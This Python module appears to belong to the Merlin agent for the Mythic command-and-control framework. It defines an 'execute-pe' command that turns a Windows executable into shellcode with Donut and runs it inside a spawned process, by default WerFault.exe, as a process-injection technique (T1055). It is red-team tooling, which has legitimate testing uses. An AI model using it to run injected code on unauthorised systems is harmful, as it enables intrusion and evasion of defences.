
from merlin import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json

# Set to enable debug output to Mythic
debug = False


class ExecutePEArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="file",
                display_name="Executable",
                description="The Windows executable (PE file) you want to run",
                type=ParameterType.File,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="New File",
                    ui_position=0,
                    required=False,
                )],
            ),
            CommandParameter(
                name="filename",
                cli_name="executable",
                display_name="Executable",
                description="The Windows executable (PE file) you want to run",
                type=ParameterType.ChooseOne,
                dynamic_query_function=get_file_list,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=0,
                    required=False,
                )],
            ),
            CommandParameter(
                name="arguments",
                cli_name="args",
                display_name="Executable Arguments",
                type=ParameterType.String,
                description="Arguments to execute the assembly with",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=1,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=1,
                        required=False,
                    ),
                ],
            ),
            CommandParameter(
                name="spawnto",
                cli_name="spawnto",
                display_name="SpawnTo Program",
                type=ParameterType.String,
                description="The child process that will be started to execute the PE in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=2,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=2,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="spawntoargs",
                cli_name="spawnto-args",
                display_name="SpawnTo Arguments",
                type=ParameterType.String,
                description="Argument to create the SpawnTo process with, if any",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=3,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=3,
                        required=False,
                    ),
                ],
            ),
            CommandParameter(
                name="verbose",
                cli_name="v",
                display_name="Verbose",
                description="Show verbose output from Donut",
                type=ParameterType.Boolean,
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=4,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=4,
                        required=False,
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class ExecutePECommand(CommandBase):
    cmd = "execute-pe"
    needs_admin = False
    help_cmd = "execute-pe <executable name> <executable args> <spawnto> <spawnto-args>\n" \
               "execute-pe -executable <executable name> -args <executable args> -spawnto <spawnto> " \
               "-spawnto-args <spawnto-args> -v (verbose)"
    description = "Convert a Windows PE into shellcode with Donut, " \
                  "execute it in the SpawnTo process, and return the output" \
                  "Change the Parameter Group to \"Default\" to use a file that was previously registered with " \
                  "Mythic and \"New File\" to register and use a new file from your host OS.\n"
    version = 1
    author = "@Ne0nd0g"
    argument_class = ExecutePEArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicRPC().execute(function_name="create_output", task_id=task.id, output=f'\n[DEBUG]Input task:{task}')

        executable_name, executable_uuid, contents = await get_file_contents(task)

        task.display_params = f'{executable_name} {task.args.get_arg("arguments")}\n ' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} ' \
                              f'SpawnTo Arguments: {task.args.get_arg("spawntoargs")}'

        # Donut
        donut_args = {
            "params": task.args.get_arg("arguments"),
            "exit": "2",
            "verbose": True,
        }
        donut_shellcode, donut_result = donut(base64.b64decode(contents), donut_args)

        if task.args.get_arg("verbose"):
            await MythicRPC().execute(
                function_name="create_output",
                task_id=task.id,
                output=f'\n[DONUT]Donut verbose output:\r\n{donut_result}\r\n'
            )

        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut_shellcode,
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }



        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("file")
        task.args.remove_arg("filename")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")
        task.args.remove_arg("verbose")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass
